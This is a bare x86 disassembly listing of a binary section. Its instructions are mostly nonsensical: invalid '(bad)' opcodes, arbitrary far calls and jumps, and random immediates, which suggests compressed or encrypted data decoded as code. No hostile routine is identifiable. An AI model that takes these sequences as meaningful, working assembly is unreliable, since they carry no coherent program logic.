  40badd:	sub    edi,DWORD PTR [esi-0x58bd74a4]
  40bae3:	daa    
  40bae4:	dec    ebp
  40bae5:	stos   BYTE PTR es:[edi],al
  40bae6:	sub    eax,0x662364
  40baeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40baec:	mov    DWORD PTR [edx+0x57],ebp
  40baef:	mul    bh
  40baf1:	cmp    eax,0xf431af59
  40baf6:	bound  esp,QWORD PTR [ebx]
  40baf8:	sbb    bh,0x9a
  40bafb:	or     bl,BYTE PTR [ebx+0x3be391b7]
  40bb01:	add    eax,0x1069a7be
  40bb06:	dec    edi
  40bb07:	test   eax,esp
  40bb09:	mov    ebp,0x72b2367b
  40bb0e:	test   DWORD PTR [ebx],0x9468e544
  40bb14:	dec    edi
  40bb15:	or     BYTE PTR [ebx-0x54],dh
  40bb18:	je     0x40bac6
  40bb1a:	inc    ecx
  40bb1b:	sti    
  40bb1c:	push   0xffffffcc
  40bb1e:	jns    0x40bad9
  40bb20:	mov    cl,0x49
  40bb22:	inc    ebp
  40bb23:	not    BYTE PTR [edi]
  40bb25:	pop    ebp
  40bb26:	sbb    BYTE PTR [eax+eiz*4-0x35],0x74
  40bb2b:	es push edi
  40bb2d:	add    cl,cl
  40bb2f:	popf   
  40bb30:	(bad)  
  40bb31:	mov    al,ds:0xea7a7cd
  40bb36:	push   ss
  40bb37:	mov    ebp,DWORD PTR [edx]
  40bb39:	add    al,0xbb
  40bb3b:	lahf   
  40bb3c:	jmp    0xd0b1:0x75857a9b
  40bb43:	dec    ebp
  40bb44:	(bad)  
  40bb45:	mov    edx,0x637bba9a
  40bb4a:	fldlg2 
  40bb4c:	sbb    BYTE PTR [edx+0xb055fd6],0x2a
  40bb53:	bound  ebx,QWORD PTR [edx]
  40bb55:	ret    
  40bb56:	cmp    DWORD PTR [edi-0x7f],ecx
  40bb59:	add    al,0x9b
  40bb5b:	and    edx,DWORD PTR [eax-0x7a]
  40bb5e:	std    
  40bb5f:	cmc    
  40bb60:	or     dh,bh
  40bb62:	dec    esi
  40bb63:	in     eax,dx
  40bb64:	fwait
  40bb65:	adc    al,0x36
  40bb67:	and    al,0x97
  40bb69:	or     DWORD PTR [ecx],ebp
  40bb6b:	(bad)  
  40bb6c:	adc    al,0xa8
  40bb6e:	pop    edx
  40bb6f:	push   ebp
  40bb70:	bound  esi,QWORD PTR [ebx+0x36b3b79a]
  40bb76:	jae    0x40bbdc
  40bb78:	mov    esp,ss
  40bb7a:	imul   esp,DWORD PTR [eax-0x73314b41],0xfffffff6
  40bb81:	imul   eax,DWORD PTR [edi],0x17
  40bb84:	lods   al,BYTE PTR ds:[esi]
  40bb85:	add    BYTE PTR [edi+0x5a9b1fbe],0x55
  40bb8c:	add    al,0x79
  40bb8e:	(bad)  
  40bb8f:	ja     0x40bb84
  40bb91:	jbe    0x40bbd0
  40bb93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb94:	std    
  40bb95:	mov    ah,dl
  40bb97:	adc    bh,BYTE PTR [ebx]
  40bb99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb9a:	adc    al,0x82
  40bb9c:	mov    bh,0xdf
  40bb9e:	mov    esi,0x5b181cbf
  40bba3:	adc    DWORD PTR [edx-0x6e],ebp
  40bba6:	stos   DWORD PTR es:[edi],eax
  40bba7:	dec    ebx
  40bba8:	jp     0x40bc10
  40bbaa:	ins    DWORD PTR es:[edi],dx
  40bbab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbac:	pusha  
  40bbad:	in     al,dx
  40bbae:	in     eax,dx
  40bbaf:	int    0xe6
  40bbb1:	aad    0xb1
  40bbb3:	sub    al,0xbc
  40bbb5:	mov    bl,0xf6
  40bbb7:	outs   dx,DWORD PTR ds:[esi]
  40bbb8:	stc    
  40bbb9:	sbb    DWORD PTR [ebp-0x68c1b2fe],ebx
  40bbbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbc0:	outs   dx,BYTE PTR ds:[esi]
  40bbc1:	cmp    BYTE PTR [edi+0x7a38a046],0xd5
  40bbc8:	mov    edx,0xf1e29a5b
  40bbcd:	fs not edi
  40bbd0:	shr    DWORD PTR [eax-0x12],cl
  40bbd3:	xlat   BYTE PTR ds:[ebx]
  40bbd4:	or     BYTE PTR [ebx],0x41
  40bbd7:	cmp    DWORD PTR [esp+esi*8-0x24],0xffffffb0
  40bbdc:	je     0x40bb78
  40bbde:	xchg   ebp,eax
  40bbdf:	lock ins DWORD PTR es:[edi],dx
  40bbe1:	(bad)  
  40bbe2:	iret   
  40bbe3:	mov    ebx,0xaa3c1835
  40bbe8:	mov    ds:0x917a3b51,al
  40bbed:	or     eax,DWORD PTR [edx+0x56]
  40bbf0:	mov    dh,0xa
  40bbf2:	mov    edi,0x9ad200d7
  40bbf7:	push   0x32
  40bbf9:	daa    
  40bbfa:	xor    BYTE PTR [ecx-0x7c],bl
  40bbfd:	test   eax,0x8922a4fa
  40bc02:	mov    WORD PTR [eax-0x8],ss
  40bc05:	inc    ebx
  40bc06:	inc    ebp
  40bc07:	(bad)  
  40bc08:	into   
  40bc09:	xor    edx,0x7b
  40bc0c:	(bad)  
  40bc0d:	out    dx,eax
  40bc0e:	inc    esp
  40bc0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc10:	jo     0x40bc82
  40bc12:	cwde   
  40bc13:	(bad)  
  40bc14:	xor    eax,0x99a7036b
  40bc19:	aaa    
  40bc1a:	js     0x40bc4d
  40bc1c:	imul   eax,DWORD PTR [eax+0x53],0x40dcb248
  40bc23:	pop    edx
  40bc24:	lds    ebp,FWORD PTR [edi+0xbabb9e3]
  40bc2a:	jns    0x40bc30
  40bc2c:	jbe    0x40bca7
  40bc2e:	xchg   ebp,eax
  40bc2f:	adc    dl,ah
  40bc31:	pusha  
  40bc32:	call   0x870:0x6f69dc87
  40bc39:	sub    ch,BYTE PTR [ecx]
  40bc3b:	mov    ebx,0xe73d3de8
  40bc40:	inc    edx
  40bc41:	dec    edx
  40bc42:	imul   esi,DWORD PTR [esi+edi*2],0xbd12e3e4
  40bc49:	leave  
  40bc4a:	stos   DWORD PTR es:[edi],eax
  40bc4b:	iret   
  40bc4c:	(bad)  
  40bc4d:	retf   
  40bc4e:	aas    
  40bc4f:	xchg   BYTE PTR [eax-0x205bd9ed],dl
  40bc55:	in     eax,dx
  40bc56:	test   ch,cl
  40bc58:	sbb    BYTE PTR [ecx],al
  40bc5a:	inc    edx
  40bc5b:	push   edi
  40bc5c:	push   ebx
  40bc5d:	mov    bl,BYTE PTR [ecx+0x6c76c524]
  40bc63:	fsubrp st(5),st
  40bc65:	mov    edx,DWORD PTR [edi-0x2ff49fd5]
  40bc6b:	popa   
  40bc6c:	dec    al
  40bc6e:	pop    ss
  40bc6f:	retf   
  40bc70:	cs cmp bl,ch
  40bc73:	cmp    al,0xb5
  40bc75:	lods   eax,DWORD PTR ds:[esi]
  40bc76:	jo     0x40bc80
  40bc78:	dec    ecx
  40bc79:	mov    BYTE PTR [edx],ch
  40bc7b:	sti    
  40bc7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc7d:	scas   ax,WORD PTR es:[edi]
  40bc7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc80:	push   0x94a41df1
  40bc85:	hlt    
  40bc86:	sar    BYTE PTR [edi+0x5e51fab3],0xdc
  40bc8d:	mov    ecx,0x784a9f74
  40bc92:	xchg   DWORD PTR [esi-0x2ef6201f],esp
  40bc98:	mov    ds:0xc18785b8,al
  40bc9d:	dec    esi
  40bc9e:	call   0x7b7a:0x89e6d199
  40bca5:	fst    QWORD PTR [edi+0x3feeda7]
  40bcab:	xchg   ebx,eax
  40bcac:	popf   
  40bcad:	jo     0x40bc3f
  40bcaf:	dec    BYTE PTR [eax+edx*1-0x3c7bd8a5]
  40bcb6:	mov    eax,ds:0x7fa54e6c
  40bcbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcbc:	mov    edi,0x63d21f1
  40bcc1:	aas    
  40bcc2:	call   0xa2547099
  40bcc7:	mov    edx,0xab41d2bb
  40bccc:	jb     0x40bd21
  40bcce:	test   DWORD PTR [eax-0x169e6d18],esp
  40bcd4:	pusha  
  40bcd5:	pop    ebx
  40bcd6:	sbb    bl,ah
  40bcd8:	inc    eax
  40bcd9:	xor    edi,DWORD PTR [edx-0x1a]
  40bcdc:	sub    al,BYTE PTR [ebp-0x7e4dc61d]
  40bce2:	push   cs
  40bce3:	js     0x40bc7e
  40bce5:	xchg   ebx,eax
  40bce6:	clc    
  40bce7:	mov    DWORD PTR ds:0xb0ec580b,ebp
  40bced:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcee:	dec    ebp
  40bcef:	out    dx,al
  40bcf0:	imul   esi,DWORD PTR [ebx-0x66],0x504ead88
  40bcf7:	fsubr  DWORD PTR [esi+0x32]
  40bcfa:	div    BYTE PTR [ebp-0x586a9b85]
  40bd00:	pop    edx
  40bd01:	pop    ecx
  40bd02:	inc    edi
  40bd03:	popa   
  40bd04:	and    eax,0xb2580afe
  40bd09:	jne    0x40bd2c
  40bd0b:	(bad)  
  40bd0c:	popf   
  40bd0d:	jl     0x40bcb4
  40bd0f:	xor    al,0x65
  40bd11:	stc    
  40bd12:	cli    
  40bd13:	dec    esp
  40bd14:	inc    ebx
  40bd15:	inc    eax
  40bd16:	inc    edx
  40bd17:	stos   DWORD PTR es:[edi],eax
  40bd18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd19:	or     edi,DWORD PTR [ebx+eiz*2-0x60]
  40bd1d:	mov    ?,WORD PTR ds:0x9afc2dba
  40bd23:	inc    ebp
  40bd24:	or     bh,bh
  40bd26:	imul   ebp,DWORD PTR [edx+0x33],0x7e
  40bd2a:	mov    DWORD PTR [edi+0x1f690254],esp
  40bd30:	dec    ebx
  40bd31:	cmp    eax,DWORD PTR [eax-0x75]
  40bd34:	mov    dl,0x1e
  40bd36:	lock or al,BYTE PTR [ecx]
  40bd39:	(bad)
  40bd3c:	(bad)  
  40bd3d:	add    eax,0xc872d2f8
  40bd42:	cmp    ah,al
  40bd44:	xor    eax,0xb239d86e
  40bd49:	loop   0x40bd3e
  40bd4b:	mov    edx,0x67bfec1
  40bd50:	test   DWORD PTR [ebx],0xeba250ee
  40bd56:	jg     0x40bd19
  40bd58:	aas    
  40bd59:	dec    esp
  40bd5a:	call   0xd387:0x7948fac4
  40bd61:	add    DWORD PTR [ebx+0x6c572a0],edi
  40bd67:	test   ch,bl
  40bd69:	sbb    ebp,ebx
  40bd6b:	jns    0x40bd3f
  40bd6d:	mov    ds,WORD PTR [ebx-0x68693095]
  40bd73:	inc    eax
  40bd74:	push   edi
  40bd75:	add    eax,esi
  40bd77:	pop    ss
  40bd78:	lods   al,BYTE PTR ds:[esi]
  40bd79:	mov    ebp,0x9bb2fc60
  40bd7e:	or     eax,0xac573a86
  40bd83:	jl     0x40bd7d
  40bd85:	or     esp,DWORD PTR [ebp-0x190d5555]
  40bd8b:	inc    esp
  40bd8c:	(bad)
  40bd91:	(bad)  
  40bd92:	xchg   edx,eax
  40bd93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd94:	shr    DWORD PTR [eax],0x2c
  40bd97:	cmp    BYTE PTR [esp+eax*1],dl
  40bd9a:	fs jmp esi
  40bd9d:	jb     0x40be19
  40bd9f:	pop    ds
  40bda0:	mov    DWORD PTR [esi],eax
  40bda2:	jmp    0xa72c:0xa95db1d2
  40bda9:	dec    ebp
  40bdaa:	ret    
  40bdab:	daa    
  40bdac:	lods   eax,DWORD PTR ds:[esi]
  40bdad:	sub    esp,ecx
  40bdaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdb0:	inc    ecx
  40bdb1:	inc    esi
  40bdb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bdb3:	mov    cl,0x7a
  40bdb5:	in     eax,0xe0
  40bdb7:	or     DWORD PTR [ecx+0x402e2120],esi
  40bdbd:	fcomp  DWORD PTR [esi+0x6f]
  40bdc0:	xor    BYTE PTR [edi+0x41],dl
  40bdc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdc4:	mov    bl,0x7
  40bdc6:	cli    
  40bdc7:	cmc    
  40bdc8:	pop    edx
  40bdc9:	add    DWORD PTR [eax],ebp
  40bdcb:	xchg   esi,eax
  40bdcc:	mov    dl,0x74
  40bdce:	or     al,0x3b
  40bdd0:	cdq    
  40bdd1:	sub    ecx,edx
  40bdd3:	(bad)  
  40bdd4:	jge    0x40bde1
  40bdd6:	xchg   edi,eax
  40bdd7:	fistp  WORD PTR [esi-0x7f91bdfe]
  40bddd:	setp   BYTE PTR [eax+0xe]
  40bde1:	or     al,0x4
  40bde3:	test   BYTE PTR ds:0x44a7f1eb,bh
  40bde9:	pushf  
  40bdea:	push   esi
  40bdeb:	or     ebx,DWORD PTR [ecx]
  40bded:	test   al,0xdf
  40bdef:	aam    0xb2
  40bdf1:	jns    0x40be2d
  40bdf3:	ret    
  40bdf4:	jmp    0xe557:0x4b9c7dd1
  40bdfb:	xchg   edx,eax
  40bdfc:	mov    ebp,0xf2d6e4f9
  40be01:	jmp    0xb448d33e
  40be06:	call   0x5776:0x9b19fda8
  40be0d:	daa    
  40be0e:	jge    0x40bdb7
  40be10:	loopne 0x40bdbf
  40be12:	mov    WORD PTR [ecx+0x3c],fs
  40be15:	cmc    
  40be16:	xlat   BYTE PTR ds:[ebx]
  40be17:	ret    
  40be18:	mov    dl,0x95
  40be1a:	out    dx,al
  40be1b:	lods   eax,DWORD PTR ds:[esi]
  40be1c:	sbb    esi,DWORD PTR cs:[ebp-0x10fa15e8]
  40be23:	mov    gs:0x97feba69,eax
  40be29:	inc    ebp
  40be2a:	xchg   edx,eax
  40be2b:	mov    DWORD PTR [ecx-0x1dc89571],esi
  40be31:	add    al,0x2
  40be33:	push   edi
  40be34:	hlt    
  40be35:	dec    edi
  40be36:	pop    ecx
  40be37:	mov    al,ds:0x4e8760e8
  40be3c:	xor    al,0xfb
  40be3e:	sbb    BYTE PTR [eax+0x0],ah
  40be41:	aas    
  40be42:	call   0xc7f4:0xcf7a70f7
  40be49:	(bad)  
  40be4a:	pop    ds
  40be4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be4c:	cmp    BYTE PTR [ebx+ebp*1],0x6e
  40be50:	mov    dh,0xbd
  40be52:	in     al,dx
  40be53:	leave  
  40be54:	sahf   
  40be55:	out    dx,eax
  40be56:	mov    eax,0xe51cb29d
  40be5b:	arpl   bp,si
  40be5d:	add    DWORD PTR [ebx],ecx
  40be5f:	fldenv [eax+0xb]
  40be62:	fisubr DWORD PTR [eax-0x6279f06a]
  40be68:	ins    BYTE PTR es:[edi],dx
  40be69:	push   ss
  40be6a:	call   0x2d90:0x5ca20e2d
  40be71:	inc    esp
  40be72:	inc    ebx
  40be73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be74:	jmp    0x40be9a
  40be76:	aas    
  40be77:	jg     0x40bedc
  40be79:	pushf  
  40be7a:	imul   ebp,DWORD PTR [ecx+ecx*8],0xdb339a1f
  40be81:	mov    dh,0xe7
  40be83:	sub    esp,eax
  40be85:	or     ah,dh
  40be87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be88:	push   ebx
  40be89:	int    0x19
  40be8b:	dec    ebp
  40be8c:	sub    bp,WORD PTR [esi]
  40be8f:	(bad)  
  40be90:	mov    dl,0xb2
  40be92:	fild   QWORD PTR [ecx-0x42]
  40be95:	int3   
  40be96:	cwde   
  40be97:	hlt    
  40be98:	sbb    BYTE PTR [ebx-0xd],dl
  40be9b:	xor    DWORD PTR [edx-0x72c88374],esi
  40bea1:	lea    di,[edx-0x40]
  40bea5:	nop
  40bea6:	cdq    
  40bea7:	pop    edi
  40bea8:	inc    eax
  40bea9:	pop    edi
  40beaa:	hlt    
  40beab:	or     eax,0xdbf2cba9
  40beb0:	bound  ecx,QWORD PTR [ebx]
  40beb2:	ret    
  40beb3:	ss xchg edx,eax
  40beb5:	and    eax,0xccb09c65
  40beba:	call   0xad8c:0xaa1fd5f1
  40bec1:	adc    BYTE PTR [edi],ch
  40bec3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bec4:	pop    ebx
  40bec5:	push   edi
  40bec6:	xchg   esp,eax
  40bec8:	nop
  40bec9:	aam    0x17
  40becb:	jne    0x40be82
  40becd:	xor    dl,BYTE PTR [eax-0x7b480ac2]
  40bed3:	inc    edi
  40bed4:	ins    BYTE PTR es:[edi],dx
  40bed5:	xlat   BYTE PTR ds:[ebx]
  40bed6:	pushf  
  40bed7:	sub    al,0x56
  40bed9:	or     edx,DWORD PTR [esi]
  40bedb:	int    0x8e
  40bedd:	je     0x40bf09
  40bedf:	inc    ecx
  40bee0:	sbb    DWORD PTR [edx+ebx*4-0x148336e7],0x65
  40bee8:	cld    
  40bee9:	mov    BYTE PTR [edx-0x5916d359],dl
  40beef:	mov    dh,0x1f
  40bef1:	aad    0xfd
  40bef3:	in     al,0xb2
  40bef5:	loop   0x40bec0
  40bef7:	iret   
  40bef8:	in     al,dx
  40bef9:	mov    ecx,0xe3080779
  40befe:	popa   
  40beff:	pop    edi
  40bf00:	(bad)  
  40bf01:	jnp    0x40befd
  40bf03:	scas   al,BYTE PTR es:[edi]
  40bf04:	xor    DWORD PTR [ebx],ebp
  40bf06:	mov    bh,0x41
  40bf08:	cmp    eax,0x4cf89a61
  40bf0d:	jno    0x40beb0
  40bf0f:	and    DWORD PTR [edx+0x222e5c5e],esi
  40bf15:	lods   al,BYTE PTR ds:[esi]
  40bf16:	int    0xa8
  40bf18:	nop
  40bf19:	or     ecx,edx
  40bf1b:	test   eax,0x63c49f30
  40bf20:	cmp    DWORD PTR [eax-0x6b],esp
  40bf23:	int    0x95
  40bf25:	mov    ds:0xba9f4009,eax
  40bf2a:	stos   BYTE PTR es:[edi],al
  40bf2b:	aaa    
  40bf2c:	lods   eax,DWORD PTR ds:[esi]
  40bf2d:	and    DWORD PTR [ecx+0x59],ebp
  40bf30:	mov    bh,0xb
  40bf32:	sub    ah,BYTE PTR [eax]
  40bf34:	or     DWORD PTR [ecx],ebx
  40bf36:	(bad)  
  40bf37:	cdq    
  40bf38:	mov    esi,0xc812ef44
  40bf3d:	inc    edi
  40bf3e:	mov    eax,ds:0xb90b0a65
  40bf43:	les    ecx,FWORD PTR [eax-0x43fbb5be]
  40bf49:	aaa    
  40bf4a:	scas   eax,DWORD PTR es:[edi]
  40bf4b:	shl    DWORD PTR [edx+0x3fc6c2b0],1
  40bf51:	jbe    0x40bf05
  40bf53:	aas    
  40bf54:	mov    ch,0xee
  40bf56:	xchg   esi,eax
  40bf57:	mov    ah,0x62
  40bf59:	lods   eax,DWORD PTR ds:[esi]
  40bf5a:	dec    edx
  40bf5b:	stos   BYTE PTR es:[edi],al
  40bf5c:	lahf   
  40bf5d:	push   edx
  40bf5e:	frstor [eax-0x6fde332a]
  40bf64:	mov    cl,ah
  40bf66:	int3   
  40bf67:	mul    DWORD PTR [ecx]
  40bf69:	sub    al,0x17
  40bf6b:	add    esi,DWORD PTR [edx-0x7b30bc0b]
  40bf71:	mov    ah,0x7c
  40bf73:	lock cmp DWORD PTR [ebx],ecx
  40bf76:	fcomp  DWORD PTR ds:0x7c6a1f1e
  40bf7c:	push   cs
  40bf7d:	cdq    
  40bf7e:	call   0xf6fa:0x7f68971a
  40bf85:	popf   
  40bf86:	jecxz  0x40bfd3
  40bf88:	xchg   BYTE PTR [ecx],bl
  40bf8a:	mov    ebp,0xab0c1964
  40bf8f:	sub    edi,DWORD PTR [ecx+0x6f76a02a]
  40bf95:	mov    ebp,DWORD PTR [edx+0x32]
  40bf98:	loopne 0x40bfa4
  40bf9a:	mov    eax,ds:0xa50ba030
  40bf9f:	jmp    0x40bf3d
  40bfa1:	out    dx,al
  40bfa2:	mov    ch,0x63
  40bfa4:	clc    
  40bfa5:	call   0x39c:0xfd34d9a
  40bfac:	and    dh,cl
  40bfae:	cmp    ah,BYTE PTR [edi+0x439df23b]
  40bfb4:	icebp  
  40bfb5:	stc    
  40bfb6:	mov    ds:0x6064b2d8,eax
  40bfbb:	adc    ebx,ebx
  40bfbd:	fldenv [eiz*8-0x2314f42c]
  40bfc4:	call   0xae956a4a
  40bfc9:	mov    al,0x9a
  40bfcb:	out    dx,eax
  40bfcc:	aas    
  40bfcd:	or     eax,0xcc9e3727
  40bfd2:	adc    eax,0xade1cda7
  40bfd7:	imul   esp,DWORD PTR [esi-0x4d5d68b3],0xffffff8e
  40bfde:	hlt    
  40bfdf:	mov    esp,0xf35a4e6b
  40bfe4:	adc    cl,BYTE PTR [ebx]
  40bfe6:	aad    0xa1
  40bfe8:	in     eax,0xaf
  40bfea:	retf   
  40bfeb:	daa    
  40bfec:	push   edi
  40bfed:	push   ebp
  40bfee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfef:	mov    ebx,0x914b0bd8
  40bff4:	ret    
  40bff5:	or     al,0xd9
  40bff7:	mov    ch,0xb8
  40bff9:	or     ebp,ebp
  40bffb:	xor    BYTE PTR [edx+edi*8+0x6fbb11ea],0x9b
  40c003:	sub    BYTE PTR [ebx],dh
  40c005:	ja     0x40bfeb
  40c007:	out    dx,eax
  40c008:	pop    ebp
  40c009:	addr16 push edx
  40c00b:	mov    ebp,edx
  40c00d:	or     edi,edi
  40c00f:	fisubr WORD PTR [edi]
  40c011:	xchg   edx,eax
  40c012:	int3   
  40c013:	cdq    
  40c014:	inc    ebx
  40c015:	mov    eax,ds:0xa6cfe9a
  40c01a:	cmp    BYTE PTR [ebx-0x5bf62345],bh
  40c020:	mov    ds,ecx
  40c022:	jb     0x40c040
  40c024:	xchg   BYTE PTR [ebp-0x18256686],ch
  40c02a:	out    0xdc,al
  40c02c:	dec    eax
  40c02d:	aad    0x3b
  40c02f:	jle    0x40c049
  40c031:	cli    
  40c032:	xor    dh,BYTE PTR [ebx-0x5a]
  40c035:	or     DWORD PTR [eax-0x4a],esp
  40c038:	retf   0x87eb
  40c03b:	jmp    DWORD PTR [ebp+0x67]
  40c03e:	fiadd  DWORD PTR [edx]
  40c040:	jle    0x40c017
  40c042:	cmp    BYTE PTR [ebp-0x58a68b1d],dh
  40c048:	add    DWORD PTR [edi],esi
  40c04a:	hlt    
  40c04b:	outs   dx,DWORD PTR ds:[esi]
  40c04c:	es xchg ecx,eax
  40c04e:	add    ebx,edi
  40c050:	mov    dl,0x1
  40c052:	mov    al,0x85
  40c054:	mov    ch,BYTE PTR [esi+ebp*2+0x66]
  40c058:	lock icebp 
  40c05a:	pop    es
  40c05b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c05c:	dec    edx
  40c05d:	addr16 pop esp
  40c05f:	fwait
  40c060:	rep stos BYTE PTR es:[edi],al
  40c062:	jl     0x40c0dd
  40c064:	mov    bl,0x4e
  40c066:	(bad)  
  40c067:	(bad)  
  40c068:	lahf   
  40c069:	enter  0xf270,0x6a
  40c06d:	mov    ds:0x4f18a747,eax
  40c072:	(bad)  
  40c073:	jnp    0x40c0eb
  40c075:	xor    ecx,0x19c3b268
  40c07b:	jns    0x40c045
  40c07d:	add    bl,BYTE PTR [ebp+0x630b6ff4]
  40c083:	test   al,0x7f
  40c085:	mov    ecx,0xe89dde4c
  40c08a:	jl     0x40c076
  40c08c:	mov    ch,0x30
  40c08e:	loop   0x40c0a6
  40c090:	dec    esp
  40c091:	cmp    al,0xbb
  40c093:	retf   
  40c094:	rol    bh,cl
  40c096:	inc    edx
  40c097:	add    DWORD PTR [edi+0x4ecfbf0b],esi
  40c09d:	clc    
  40c09e:	add    eax,0x9a9cb885
  40c0a3:	pop    esp
  40c0a4:	iret   
  40c0a5:	sbb    ch,bh
  40c0a7:	cwde   
  40c0a8:	test   eax,0xe6a71d7b
  40c0ad:	jle    0x40c080
  40c0af:	lods   al,BYTE PTR ds:[esi]
  40c0b0:	fimul  DWORD PTR [ecx+0x41b25700]
  40c0b6:	push   esp
  40c0b7:	push   0xffffffbb
  40c0b9:	mov    esp,0xebb465e2
  40c0be:	enter  0x66a7,0xf4
  40c0c2:	pop    ecx
  40c0c3:	nop
  40c0c4:	aaa    
  40c0c5:	cmp    BYTE PTR [eax-0x3f],cl
  40c0c8:	mov    dl,0xcc
  40c0ca:	popa   
  40c0cb:	pcmpgtw mm6,QWORD PTR [eax]
  40c0ce:	test   al,0x7f
  40c0d0:	pop    eax
  40c0d1:	or     eax,edi
  40c0d3:	push   eax
  40c0d4:	out    0xe6,al
  40c0d6:	scas   eax,DWORD PTR es:[edi]
  40c0d7:	inc    eax
  40c0d8:	fcomp  DWORD PTR [esi]
  40c0da:	call   0xfd6:0x763c88ce
  40c0e1:	fimul  WORD PTR [edx]
  40c0e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0e4:	ins    BYTE PTR es:[edi],dx
  40c0e5:	sbb    eax,0x347404a4
  40c0ea:	pop    ds
  40c0eb:	pop    eax
  40c0ec:	lods   eax,DWORD PTR ds:[esi]
  40c0ed:	gs jl  0x40c08e
  40c0f0:	out    dx,al
  40c0f1:	mov    bh,0x5a
  40c0f3:	inc    esp
  40c0f4:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40c0f6:	popf   
  40c0f7:	into   
  40c0f8:	lahf   
  40c0f9:	or     eax,DWORD PTR [ebp-0x1d]
  40c0fc:	adc    eax,0xd62a5404
  40c101:	fild   WORD PTR [esi+0x50e77a22]
  40c107:	shr    BYTE PTR [eax-0x77],cl
  40c10a:	call   0x5aec:0x94ac2113
  40c111:	xor    ebx,DWORD PTR [esi]
  40c113:	retf   
  40c114:	xor    dl,BYTE PTR [edx+ecx*4-0x2bb5401c]
  40c11b:	iret   
  40c11c:	mov    dl,0x39
  40c11e:	aas    
  40c11f:	pusha  
  40c120:	push   0xffffffbb
  40c122:	enter  0x91af,0xc
  40c126:	jle    0x40c12e
  40c128:	sbb    esi,DWORD PTR [edx+0x5a]
  40c12b:	(bad)  
  40c12c:	cmp    bl,BYTE PTR [edx]
  40c12e:	sub    BYTE PTR [esi+ecx*2-0x67155801],0x77
  40c136:	call   0x90a6:0xd13a2f9e
  40c13d:	outs   dx,DWORD PTR ds:[esi]
  40c13e:	scas   eax,DWORD PTR es:[edi]
  40c13f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c140:	rcr    ebx,cl
  40c142:	xor    esi,ebp
  40c144:	call   0x86f0:0xaf6467ca
  40c14b:	(bad)  
  40c14c:	repnz cli 
  40c14e:	pop    es
  40c14f:	into   
  40c150:	sbb    BYTE PTR [ebx+0x4f4dab0],al
  40c156:	xor    DWORD PTR [esi],ebp
  40c158:	adc    al,0x3c
  40c15a:	stc    
  40c15b:	in     eax,0xea
  40c15d:	retf   0x676e
  40c160:	ja     0x40c108
  40c162:	jmp    0x5d17:0x9ad80231
  40c169:	jae    0x40c1da
  40c16b:	aad    0x4f
  40c16d:	jno    0x40c1c1
  40c16f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c170:	out    dx,eax
  40c171:	jmp    0xa15c:0x4fd0bb1f
  40c178:	mov    bl,0xd6
  40c17a:	xchg   ebx,eax
  40c17b:	lods   eax,DWORD PTR ds:[esi]
  40c17c:	and    bh,cl
  40c17e:	pxor   mm1,QWORD PTR [esi-0x4c]
  40c182:	dec    esp
  40c183:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c184:	and    eax,0x370165cc
  40c189:	out    0xa1,eax
  40c18b:	popa   
  40c18c:	mov    dl,0x96
  40c18e:	add    eax,0x2976614c
  40c193:	adc    ebx,edx
  40c195:	or     ecx,esp
  40c197:	inc    ebp
  40c198:	dec    edx
  40c199:	cmc    
  40c19a:	dec    ebp
  40c19b:	adc    BYTE PTR [edi+0xc],cl
  40c19e:	call   0xcb76:0x88f1c97f
  40c1a5:	sub    al,0xed
  40c1a7:	sti    
  40c1a8:	pop    edx
  40c1a9:	mov    ebp,0xac8abe99
  40c1ae:	jl     0x40c13a
  40c1b0:	jp     0x40c1a4
  40c1b2:	int3   
  40c1b3:	mov    dh,0xb2
  40c1b5:	ja     0x40c21c
  40c1b7:	pop    ss
  40c1b8:	inc    edx
  40c1b9:	into   
  40c1ba:	ja     0x40c1d5
  40c1bc:	sub    BYTE PTR [ebx],cl
  40c1be:	pop    ecx
  40c1bf:	out    0x72,al
  40c1c1:	xor    BYTE PTR [ecx+0x0],dh
  40c1c4:	pop    eax
  40c1c5:	and    bl,BYTE PTR [edi-0x25d3a83d]
  40c1cb:	xchg   esp,eax
  40c1cc:	xor    dl,bl
  40c1ce:	push   ecx
  40c1cf:	xchg   ah,bl
  40c1d1:	or     ebp,DWORD PTR [esi]
  40c1d3:	adc    eax,0x2e9dec4c
  40c1d8:	pop    ss
  40c1d9:	std    
  40c1da:	xchg   ebp,eax
  40c1db:	jno    0x40c1ce
  40c1dd:	mov    bh,0xfd
  40c1df:	inc    edi
  40c1e0:	shl    DWORD PTR [esp+eiz*4-0x56f4fc62],1
  40c1e7:	setb   BYTE PTR [esi+ecx*2-0x609a980a]
  40c1ef:	cmp    BYTE PTR [eax+esi*4-0xe],ah
  40c1f3:	mov    esi,0xbd47d3ad
  40c1f8:	icebp  
  40c1f9:	shr    BYTE PTR [ebx+edx*2+0x1c],0xb3
  40c1fe:	and    cl,BYTE PTR [ebp-0xc]
  40c201:	or     eax,esp
